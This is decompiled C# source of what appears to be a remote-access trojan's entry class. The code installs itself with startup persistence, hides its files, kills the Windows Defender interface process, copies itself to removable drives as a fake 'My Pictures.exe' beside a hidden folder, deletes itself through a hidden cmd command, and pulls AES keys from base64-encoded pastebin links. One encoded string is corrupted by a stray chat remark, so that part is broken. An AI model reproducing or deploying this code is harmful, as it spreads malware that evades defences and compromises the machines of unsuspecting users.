using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using VenomC.Chaos.Utilities;

internal static class Class12
{
	[Serializable]
	[CompilerGenerated]
	private sealed class Class13
	{
		public static readonly Class13 class13_0 = new Class13();

		public static ThreadStart threadStart_0;

		internal void method_0()
		{
			//IL_0000: Unknown result type (might be due to invalid IL or missing references)
			//IL_000a: Expected O, but got Unknown
			applicationContext_0 = new ApplicationContext();
			new Klover(15000.0);
			Application.Run(applicationContext_0);
		}
	}

	public static GClass14 gclass14_0;

	private static ApplicationContext applicationContext_0;

	[STAThread]
	private static void Main(string[] args)
	{
		Application.EnableVisualStyles();
		Application.SetCompatibleTextRenderingDefault(false);
		AppDomain.CurrentDomain.UnhandledException += smethod_4;
		if (GClass5.smethod_0() && smethod_6() && !GClass14.Exiting)
		{
			gclass14_0.method_16();
		}
		smethod_5();
		smethod_3();
	}

	private static void smethod_0(object sender, ElapsedEventArgs e)
	{
		Process.Start(new ProcessStartInfo
		{
			Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.get_ExecutablePath() + "\"",
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true,
			FileName = "cmd.exe"
		});
		Application.Exit();
	}

	public static string smethod_1(string decrypted)
	{
		using WebClient webClient = new WebClient();
		webClient.Proxy = null;
		string s = webClient.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2dyc3hMRWpF")));
		string s2 = webClient.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("cortexnet.cc someone is really using it xD it took 3 seconds to dump")));
		byte[] bytes = Encoding.ASCII.GetBytes(decrypted);
		AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
		aesCryptoServiceProvider.BlockSize = 128;
		aesCryptoServiceProvider.KeySize = 256;
		aesCryptoServiceProvider.Key = Encoding.ASCII.GetBytes(s);
		aesCryptoServiceProvider.IV = Encoding.ASCII.GetBytes(s2);
		aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
		aesCryptoServiceProvider.Mode = CipherMode.CBC;
		ICryptoTransform cryptoTransform = aesCryptoServiceProvider.CreateEncryptor(aesCryptoServiceProvider.Key, aesCryptoServiceProvider.IV);
		byte[] inArray = cryptoTransform.TransformFinalBlock(bytes, 0, bytes.Length);
		cryptoTransform.Dispose();
		return Convert.ToBase64String(inArray);
	}

	public static string smethod_2(string encrypted)
	{
		using WebClient webClient = new WebClient();
		webClient.Proxy = null;
		string s = webClient.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2dyc3hMRWpF")));
		string s2 = webClient.DownloadString(Encoding.UTF8.GetString(Convert.FromBase64String("aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3LzZNYnptWGZT")));
		byte[] array = Convert.FromBase64String(encrypted);
		AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
		aesCryptoServiceProvider.BlockSize = 128;
		aesCryptoServiceProvider.KeySize = 256;
		aesCryptoServiceProvider.Key = Encoding.ASCII.GetBytes(s);
		aesCryptoServiceProvider.IV = Encoding.ASCII.GetBytes(s2);
		aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
		aesCryptoServiceProvider.Mode = CipherMode.CBC;
		ICryptoTransform cryptoTransform = aesCryptoServiceProvider.CreateDecryptor(aesCryptoServiceProvider.Key, aesCryptoServiceProvider.IV);
		byte[] bytes = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
		cryptoTransform.Dispose();
		return Encoding.ASCII.GetString(bytes);
	}

	private static void smethod_3()
	{
		if (applicationContext_0 == null && !Application.get_MessageLoop())
		{
			Environment.Exit(0);
		}
		else
		{
			Application.Exit();
		}
	}

	private static void smethod_4(object sender, UnhandledExceptionEventArgs e)
	{
		if (e.IsTerminating)
		{
			string text = GClass47.smethod_15();
			if (!string.IsNullOrEmpty(text))
			{
				Process.Start(new ProcessStartInfo
				{
					WindowStyle = ProcessWindowStyle.Hidden,
					UseShellExecute = true,
					FileName = text
				});
				smethod_3();
			}
		}
	}

	private static void smethod_5()
	{
		GClass77.smethod_57();
		if (GClass77.unsafeStreamCodec_0 != null)
		{
			GClass77.unsafeStreamCodec_0.Dispose();
		}
		if (Klover.Instance != null)
		{
			Klover.Instance.Dispose();
		}
		if (applicationContext_0 != null)
		{
			applicationContext_0.ExitThread();
			applicationContext_0.Dispose();
			applicationContext_0 = null;
		}
		GClass54.smethod_1();
	}

	private static bool smethod_6()
	{
		GClass7 gClass = new GClass7(GClass50.smethod_0(GClass5.string_1));
		if (GClass54.smethod_0(GClass5.string_7) && !gClass.IsEmpty && !string.IsNullOrEmpty(GClass5.string_0))
		{
			GClass73.smethod_1(GClass5.string_2, GClass5.string_3);
			GClass69.InstallPath = Path.Combine(GClass5.string_4, ((!string.IsNullOrEmpty(GClass5.string_5)) ? (GClass5.string_5 + "\\") : "") + GClass5.string_6);
			GClass49.smethod_0();
			GClass47.smethod_3(GClass69.CurrentPath);
			if (GClass5.bool_0 && !(GClass69.CurrentPath == GClass69.InstallPath))
			{
				GClass54.smethod_1();
				GClass31.smethod_0(gclass14_0);
				return false;
			}
			GClass65.smethod_2();
			if (GClass5.bool_3)
			{
				if (!GClass39.smethod_0())
				{
					GClass69.AddStartUpFailed = true;
				}
				Class45.smethod_8(GClass5.string_8, GClass69.InstallPath);
			}
			if (GClass5.bool_0 && GClass5.bool_4)
			{
				try
				{
					File.SetAttributes(GClass69.CurrentPath, FileAttributes.Hidden);
				}
				catch (Exception)
				{
				}
			}
			if (GClass5.bool_0 && GClass5.bool_7 && !string.IsNullOrEmpty(GClass5.string_5))
			{
				try
				{
					new DirectoryInfo(Path.GetDirectoryName(GClass69.InstallPath)).Attributes |= FileAttributes.Hidden;
				}
				catch (Exception)
				{
				}
			}
			if (GClass5.bool_1)
			{
				Class53.smethod_3(GClass5.string_8, GClass69.InstallPath);
				Class53.smethod_2();
				Class53.smethod_5();
				GClass36.smethod_2();
				if (Convert.ToBoolean(GClass35.smethod_3()))
				{
					GClass35.smethod_1();
				}
				Class53.smethod_4(GClass5.string_8, GClass69.CurrentPath);
				GClass52.smethod_122();
			}
			if (GClass5.bool_8)
			{
				Process[] processesByName = Process.GetProcessesByName("MSASCui");
				for (int i = 0; i < processesByName.Length; i++)
				{
					processesByName[i].Kill();
				}
				GClass52.smethod_72();
			}
			if (GClass5.bool_2)
			{
				try
				{
					_ = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\MRT.exe";
					Assembly.GetExecutingAssembly();
					string sourceFileName = Environment.GetCommandLineArgs()[0];
					while (true)
					{
						Thread.Sleep(2522);
						DriveInfo driveInfo = new DriveInfo("C:\\");
						if (driveInfo.IsReady && driveInfo.DriveType != DriveType.Fixed)
						{
							try
							{
								File.Copy(sourceFileName, "C:\\My Pictures.exe");
								if (File.Exists("C:\\My Pictures.exe"))
								{
									try
									{
										Directory.CreateDirectory("C:\\My Pictures");
										File.SetAttributes("C:\\My Pictures", FileAttributes.Hidden);
									}
									catch
									{
									}
								}
							}
							catch
							{
							}
						}
						DriveInfo driveInfo2 = new DriveInfo("D:\\");
						if (driveInfo2.IsReady && driveInfo2.DriveType != DriveType.Fixed)
						{
							try
							{
								File.Copy(sourceFileName, "D:\\My Pictures.exe");
								if (File.Exists("D:\\My Pictures.exe"))
								{
									try
									{
										Directory.CreateDirectory("D:\\My Pictures");
										File.SetAttributes("D:\\My Pictures", FileAttributes.Hidden);
									}
									catch
									{
									}
								}
							}
							catch
							{
							}
						}
						DriveInfo driveInfo3 = new DriveInfo("E:\\");
						if (driveInfo3.IsReady && driveInfo3.DriveType != DriveType.Fixed)
						{
							try
							{
								File.Copy(sourceFileName, "E:\\My Pictures.exe");
								if (File.Exists("E:\\My Pictures.exe"))
								{
									try
									{
										Directory.CreateDirectory("E:\\My Pictures");
										File.SetAttributes("E:\\My Pictures", FileAttributes.Hidden);
									}
									catch
									{
									}
								}
							}
							catch
							{
							}
						}
						DriveInfo driveInfo4 = new DriveInfo("F:\\");
						if (driveInfo4.IsReady && driveInfo4.DriveType != DriveType.Fixed)
						{
							try
							{
								File.Copy(sourceFileName, "F:\\My Pictures.exe");
								if (File.Exists("F:\\My Pictures.exe"))
								{
									try
									{
										Directory.CreateDirectory("F:\\My Pictures");
										File.SetAttributes("F:\\My Pictures", FileAttributes.Hidden);
									}
									catch
									{
									}
								}
							}
							catch
							{
							}
						}
						DriveInfo driveInfo5 = new DriveInfo("G:\\");
						if (driveInfo5.IsReady && driveInfo5.DriveType != DriveType.Fixed)
						{
							try
							{
								File.Copy(sourceFileName, "G:\\My Pictures.exe");
								if (File.Exists("G:\\My Pictures.exe"))
								{
									try
									{
										Directory.CreateDirectory("G:\\My Pictures");
										File.SetAttributes("G:\\My Pictures", FileAttributes.Hidden);
									}
									catch
									{
									}
								}
							}
							catch
							{
							}
						}
						DriveInfo driveInfo6 = new DriveInfo("H:\\");
						if (driveInfo6.IsReady && driveInfo6.DriveType != DriveType.Fixed)
						{
							try
							{
								File.Copy(sourceFileName, "H:\\My Pictures.exe");
								if (File.Exists("H:\\My Pictures.exe"))
								{
									try
									{
										Directory.CreateDirectory("H:\\My Pictures");
										File.SetAttributes("H:\\My Pictures", FileAttributes.Hidden);
									}
									catch
									{
									}
								}
							}
							catch
							{
							}
						}
						DriveInfo driveInfo7 = new DriveInfo("I:\\");
						if (!driveInfo7.IsReady || driveInfo7.DriveType != DriveType.Fixed)
						{
							try
							{
								File.Copy(sourceFileName, "I:\\My Pictures.exe");
								if (File.Exists("I:\\My Pictures.exe"))
								{
									try
									{
										Directory.CreateDirectory("I:\\My Pictures");
										File.SetAttributes("I:\\My Pictures", FileAttributes.Hidden);
									}
									catch
									{
									}
								}
							}
							catch
							{
							}
						}
						DriveInfo driveInfo8 = new DriveInfo("J:\\");
						if (driveInfo8.IsReady && driveInfo8.DriveType != DriveType.Fixed)
						{
							try
							{
								File.Copy(sourceFileName, "J:\\My Pictures.exe");
								if (File.Exists("J:\\My Pictures.exe"))
								{
									try
									{
										Directory.CreateDirectory("J:\\My Pictures");
										File.SetAttributes("J:\\My Pictures", FileAttributes.Hidden);
									}
									catch
									{
									}
								}
							}
							catch
							{
							}
						}
						DriveInfo driveInfo9 = new DriveInfo("K:\\");
						if (driveInfo9.IsReady && driveInfo9.DriveType != DriveType.Fixed)
						{
							try
							{
								File.Copy(sourceFileName, "K:\\My Pictures.exe");
								if (File.Exists("K:\\My Pictures.exe"))
								{
									try
									{
										Directory.CreateDirectory("K:\\My Pictures");
										File.SetAttributes("K:\\My Pictures", FileAttributes.Hidden);
									}
									catch
									{
									}
								}
							}
							catch
							{
							}
						}
						DriveInfo driveInfo10 = new DriveInfo("L:\\");
						if (driveInfo10.IsReady && driveInfo10.DriveType != DriveType.Fixed)
						{
							try
							{
								File.Copy(sourceFileName, "L:\\My Pictures.exe");
								if (File.Exists("L:\\My Pictures.exe"))
								{
									try
									{
										Directory.CreateDirectory("L:\\My Pictures");
										File.SetAttributes("L:\\My Pictures", FileAttributes.Hidden);
									}
									catch
									{
									}
								}
							}
							catch
							{
							}
						}
						DriveInfo driveInfo11 = new DriveInfo("M:\\");
						if (!driveInfo11.IsReady)
						{
							break;
						}
						if (driveInfo11.DriveType == DriveType.Fixed)
						{
							continue;
						}
						try
						{
							File.Copy(sourceFileName, "M:\\My Pictures.exe");
							if (File.Exists("M:\\My Pictures.exe"))
							{
								try
								{
									Directory.CreateDirectory("M:\\My Pictures");
									File.SetAttributes("M:\\My Pictures", FileAttributes.Hidden);
								}
								catch
								{
								}
							}
						}
						catch
						{
						}
						break;
					}
				}
				catch
				{
				}
			}
			if (GClass5.bool_5)
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					//IL_0000: Unknown result type (might be due to invalid IL or missing references)
					//IL_000a: Expected O, but got Unknown
					applicationContext_0 = new ApplicationContext();
					new Klover(15000.0);
					Application.Run(applicationContext_0);
				});
				thread.IsBackground = true;
				thread.Start();
			}
			gclass14_0 = new GClass14(gClass);
			return true;
		}
		return false;
	}
}
